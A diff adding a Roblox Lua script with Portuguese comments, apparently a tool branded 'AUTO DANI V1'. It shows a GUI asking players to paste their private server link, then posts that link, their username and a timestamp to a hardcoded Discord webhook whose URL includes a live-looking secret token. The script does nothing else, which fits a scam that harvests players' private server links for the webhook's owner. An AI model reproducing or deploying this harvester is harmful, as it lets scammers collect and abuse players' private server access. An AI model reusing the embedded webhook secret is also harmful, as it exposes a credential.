@@ -1,0 +1,347 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+
+-- Webhook URL para enviar os links
+local WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1443019238724997261/TBUwGxEJ2MyvJ6y0PQIhNz4ErMZ0_k7Z-e7SNk-IZrA2l15O96d7gfaijQZzf7TKJ173"
+
+-- Função para criar a tela AUTO DANI V1
+local function createAutoDaniV1Screen()
+    local player = Players.LocalPlayer
+    local playerGui = player:WaitForChild("PlayerGui")
+    
+    -- Remover GUI existente se houver
+    if playerGui:FindFirstChild("AutoDaniV1GUI") then
+        playerGui:FindFirstChild("AutoDaniV1GUI"):Destroy()
+    end
+
+    -- Tela principal
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "AutoDaniV1GUI"
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    screenGui.ResetOnSpawn = false
+    screenGui.Parent = playerGui
+
+    -- Frame principal
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Size = UDim2.new(0, 450, 0, 350)
+    mainFrame.Position = UDim2.new(0.5, -225, 0.5, -175)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(20, 25, 35)
+    mainFrame.BorderSizePixel = 0
+    mainFrame.ClipsDescendants = true
+    mainFrame.Parent = screenGui
+
+    -- Arredondar cantos
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 15)
+    corner.Parent = mainFrame
+
+    -- Efeito de borda gradiente
+    local borderStroke = Instance.new("UIStroke")
+    borderStroke.Color = Color3.fromRGB(0, 255, 200)
+    borderStroke.Thickness = 3
+    borderStroke.Parent = mainFrame
+
+    -- Cabeçalho com tema natalino
+    local header = Instance.new("Frame")
+    header.Size = UDim2.new(1, 0, 0, 80)
+    header.BackgroundColor3 = Color3.fromRGB(30, 35, 45)
+    header.BorderSizePixel = 0
+    header.Parent = mainFrame
+
+    local headerCorner = Instance.new("UICorner")
+    headerCorner.CornerRadius = UDim.new(0, 15)
+    headerCorner.Parent = header
+
+    -- Título 🎄 AUTO DANI V1
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0, 50)
+    title.Position = UDim2.new(0, 0, 0, 15)
+    title.BackgroundTransparency = 1
+    title.Text = "🎄 AUTO DANI V1"
+    title.TextColor3 = Color3.fromRGB(0, 255, 200)
+    title.TextSize = 28
+    title.Font = Enum.Font.GothamBlack
+    title.TextStrokeTransparency = 0
+    title.TextStrokeColor3 = Color3.fromRGB(0, 100, 80)
+    title.Parent = header
+
+    -- Nome em baixo do título
+    local subtitle = Instance.new("TextLabel")
+    subtitle.Size = UDim2.new(1, 0, 0, 20)
+    subtitle.Position = UDim2.new(0, 0, 0, 50)
+    subtitle.BackgroundTransparency = 1
+    subtitle.Text = "By: Project BRANZz"
+    subtitle.TextColor3 = Color3.fromRGB(200, 200, 200)
+    subtitle.TextSize = 14
+    subtitle.Font = Enum.Font.GothamBold
+    subtitle.Parent = header
+
+    -- Container do conteúdo
+    local contentFrame = Instance.new("Frame")
+    contentFrame.Size = UDim2.new(1, -40, 1, -120)
+    contentFrame.Position = UDim2.new(0, 20, 0, 100)
+    contentFrame.BackgroundTransparency = 1
+    contentFrame.Parent = mainFrame
+
+    -- Texto informativo sobre o servidor privado
+    local infoLabel = Instance.new("TextLabel")
+    infoLabel.Size = UDim2.new(1, 0, 0, 40)
+    infoLabel.Position = UDim2.new(0, 0, 0, 0)
+    infoLabel.BackgroundTransparency = 1
+    infoLabel.Text = "Cole qualquer link do servidor privado:"
+    infoLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    infoLabel.TextSize = 16
+    infoLabel.Font = Enum.Font.Gotham
+    infoLabel.TextWrapped = true
+    infoLabel.Parent = contentFrame
+
+    -- Campo para inserir o link do Roblox
+    local linkInputFrame = Instance.new("Frame")
+    linkInputFrame.Size = UDim2.new(1, 0, 0, 50)
+    linkInputFrame.Position = UDim2.new(0, 0, 0, 50)
+    linkInputFrame.BackgroundColor3 = Color3.fromRGB(35, 40, 50)
+    linkInputFrame.Parent = contentFrame
+
+    local linkInputCorner = Instance.new("UICorner")
+    linkInputCorner.CornerRadius = UDim.new(0, 10)
+    linkInputCorner.Parent = linkInputFrame
+
+    local linkInputStroke = Instance.new("UIStroke")
+    linkInputStroke.Color = Color3.fromRGB(80, 85, 95)
+    linkInputStroke.Thickness = 2
+    linkInputStroke.Parent = linkInputFrame
+
+    local linkTextBox = Instance.new("TextBox")
+    linkTextBox.Size = UDim2.new(1, -20, 1, -10)
+    linkTextBox.Position = UDim2.new(0, 10, 0, 5)
+    linkTextBox.BackgroundTransparency = 1
+    linkTextBox.PlaceholderText = "🔗 https://www.roblox.com/share?code=45c336af3ab94e42b1b644a128c94347&type=Server"
+    linkTextBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
+    linkTextBox.Text = ""
+    linkTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+    linkTextBox.TextSize = 14
+    linkTextBox.Font = Enum.Font.Gotham
+    linkTextBox.TextXAlignment = Enum.TextXAlignment.Left
+    linkTextBox.ClearTextOnFocus = false
+    linkTextBox.Parent = linkInputFrame
+
+    -- Botão Confirmar
+    local confirmButton = Instance.new("TextButton")
+    confirmButton.Size = UDim2.new(1, 0, 0, 50)
+    confirmButton.Position = UDim2.new(0, 0, 0, 120)
+    confirmButton.BackgroundColor3 = Color3.fromRGB(40, 45, 55)
+    confirmButton.Text = "AGUARDANDO LINK..."
+    confirmButton.TextColor3 = Color3.fromRGB(150, 150, 150)
+    confirmButton.TextSize = 18
+    confirmButton.Font = Enum.Font.GothamBold
+    confirmButton.AutoButtonColor = false
+    confirmButton.Parent = contentFrame
+
+    local confirmButtonCorner = Instance.new("UICorner")
+    confirmButtonCorner.CornerRadius = UDim.new(0, 12)
+    confirmButtonCorner.Parent = confirmButton
+
+    local confirmButtonStroke = Instance.new("UIStroke")
+    confirmButtonStroke.Color = Color3.fromRGB(100, 100, 100)
+    confirmButtonStroke.Thickness = 2
+    confirmButtonStroke.Parent = confirmButton
+
+    -- Status label
+    local statusLabel = Instance.new("TextLabel")
+    statusLabel.Size = UDim2.new(1, 0, 0, 30)
+    statusLabel.Position = UDim2.new(0, 0, 0, 180)
+    statusLabel.BackgroundTransparency = 1
+    statusLabel.Text = "⏳ Insira qualquer link do servidor"
+    statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    statusLabel.TextSize = 14
+    statusLabel.Font = Enum.Font.Gotham
+    statusLabel.Parent = contentFrame
+
+    -- Função para verificar se é um link válido (qualquer link agora)
+    local function isValidLink(link)
+        if not link or link == "" then
+            return false
+        end
+        
+        -- Agora aceita QUALQUER link que não esteja vazio
+        return string.len(link) > 10 -- Mínimo de 10 caracteres para ser considerado um link
+    end
+
+    -- Função para enviar o link para o webhook
+    local function sendLinkToWebhook(link)
+        local player = Players.LocalPlayer
+        local playerName = player.Name
+        local currentTime = os.date("%Y-%m-%d %H:%M:%S")
+        
+        local payload = {
+            content = "@everyone @here 🎄 NOVO LINK RECEBIDO - AUTO DANI V1",
+            embeds = {{
+                title = "🔗 LINK DO SERVIDOR PRIVADO",
+                color = 0x00FFC8,
+                fields = {
+                    {
+                        name = "👤 Usuário:",
+                        value = playerName,
+                        inline = true
+                    },
+                    {
+                        name = "🕒 Data/Hora:",
+                        value = currentTime,
+                        inline = true
+                    },
+                    {
+                        name = "🔗 Link Inserido:",
+                        value = "```" .. link .. "```",
+                        inline = false
+                    }
+                },
+                footer = {
+                    text = "AUTO DANI V1 - By: Project BRANZz"
+                },
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            }}
+        }
+        
+        local success, result = pcall(function()
+            return HttpService:RequestAsync({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode(payload)
+            })
+        end)
+        
+        return success
+    end
+
+    -- Atualizar o botão conforme o texto do link
+    linkTextBox:GetPropertyChangedSignal("Text"):Connect(function()
+        local text = linkTextBox.Text
+        
+        if isValidLink(text) then
+            confirmButton.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
+            confirmButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+            confirmButton.Text = "✅ CONFIRMAR E ENVIAR"
+            confirmButtonStroke.Color = Color3.fromRGB(0, 150, 80)
+            statusLabel.Text = "✅ Link válido! Clique para confirmar"
+            statusLabel.TextColor3 = Color3.fromRGB(0, 255, 150)
+        else
+            confirmButton.BackgroundColor3 = Color3.fromRGB(40, 45, 55)
+            confirmButton.TextColor3 = Color3.fromRGB(150, 150, 150)
+            confirmButton.Text = "AGUARDANDO LINK..."
+            confirmButtonStroke.Color = Color3.fromRGB(100, 100, 100)
+            if text == "" then
+                statusLabel.Text = "⏳ Insira qualquer link do servidor"
+                statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+            else
+                statusLabel.Text = "⚠️ Link muito curto"
+                statusLabel.TextColor3 = Color3.fromRGB(255, 200, 0)
+            end
+        end
+    end)
+
+    -- Evento de clique no botão Confirmar
+    confirmButton.MouseButton1Click:Connect(function()
+        local link = linkTextBox.Text
+        
+        if not isValidLink(link) then
+            statusLabel.Text = "❌ Insira um link válido"
+            statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+            return
+        end
+        
+        -- Desabilitar botão durante o envio
+        confirmButton.Text = "📤 ENVIANDO..."
+        confirmButton.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
+        confirmButtonStroke.Color = Color3.fromRGB(200, 130, 0)
+        statusLabel.Text = "⏳ Enviando link para o webhook..."
+        statusLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
+        
+        -- Enviar para o webhook
+        local success = sendLinkToWebhook(link)
+        
+        if success then
+            confirmButton.Text = "✅ ENVIADO COM SUCESSO!"
+            confirmButton.BackgroundColor3 = Color3.fromRGB(0, 150, 80)
+            confirmButtonStroke.Color = Color3.fromRGB(0, 120, 60)
+            statusLabel.Text = "🎉 Link enviado para o Discord com sucesso!"
+            statusLabel.TextColor3 = Color3.fromRGB(0, 255, 150)
+            
+            -- Limpar campo após envio bem-sucedido
+            wait(2)
+            linkTextBox.Text = ""
+        else
+            confirmButton.Text = "❌ ERRO AO ENVIAR"
+            confirmButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+            confirmButtonStroke.Color = Color3.fromRGB(200, 0, 0)
+            statusLabel.Text = "⚠️ Erro ao enviar. Tente novamente."
+            statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+            
+            -- Resetar após 3 segundos
+            wait(3)
+            if isValidLink(linkTextBox.Text) then
+                confirmButton.Text = "✅ CONFIRMAR E ENVIAR"
+                confirmButton.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
+                confirmButtonStroke.Color = Color3.fromRGB(0, 150, 80)
+                statusLabel.Text = "✅ Link válido! Clique para confirmar"
+                statusLabel.TextColor3 = Color3.fromRGB(0, 255, 150)
+            else
+                confirmButton.Text = "AGUARDANDO LINK..."
+                confirmButton.BackgroundColor3 = Color3.fromRGB(40, 45, 55)
+                confirmButtonStroke.Color = Color3.fromRGB(100, 100, 100)
+                statusLabel.Text = "⏳ Insira qualquer link do servidor"
+                statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+            end
+        end
+    end)
+
+    -- Efeito hover no botão
+    confirmButton.MouseEnter:Connect(function()
+        if isValidLink(linkTextBox.Text) then
+            confirmButton.BackgroundColor3 = Color3.fromRGB(0, 230, 120)
+        end
+    end)
+
+    confirmButton.MouseLeave:Connect(function()
+        if isValidLink(linkTextBox.Text) then
+            confirmButton.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
+        end
+    end)
+
+    -- Botão para fechar a GUI
+    local closeButton = Instance.new("TextButton")
+    closeButton.Size = UDim2.new(0, 30, 0, 30)
+    closeButton.Position = UDim2.new(1, -35, 0, 10)
+    closeButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
+    closeButton.Text = "X"
+    closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    closeButton.TextSize = 16
+    closeButton.Font = Enum.Font.GothamBold
+    closeButton.Parent = header
+
+    local closeCorner = Instance.new("UICorner")
+    closeCorner.CornerRadius = UDim.new(0, 8)
+    closeCorner.Parent = closeButton
+
+    closeButton.MouseButton1Click:Connect(function()
+        screenGui:Destroy()
+    end)
+
+    return screenGui
+end
+
+-- Criar a tela
+local success, err = pcall(function()
+    createAutoDaniV1Screen()
+    print("🎄 AUTO DANI V1 GUI carregada com sucesso!")
+    print("✅ Agora aceita QUALQUER link")
+    print("📤 Envia automaticamente para o webhook do Discord")
+    print("❌ Clique no X para fechar a janela")
+end)
+
+if not success then
+    warn("❌ Erro ao carregar AUTO DANI V1: " .. tostring(err))
+end
